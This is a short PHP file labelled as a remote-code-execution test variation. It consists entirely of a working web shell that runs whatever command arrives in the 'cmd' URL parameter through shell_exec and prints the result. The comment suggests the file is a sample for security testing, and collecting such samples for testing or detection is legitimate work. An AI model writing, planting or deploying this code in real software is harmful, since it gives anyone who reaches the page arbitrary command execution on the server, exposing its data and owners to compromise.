<?php
// RCE test variation #781
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>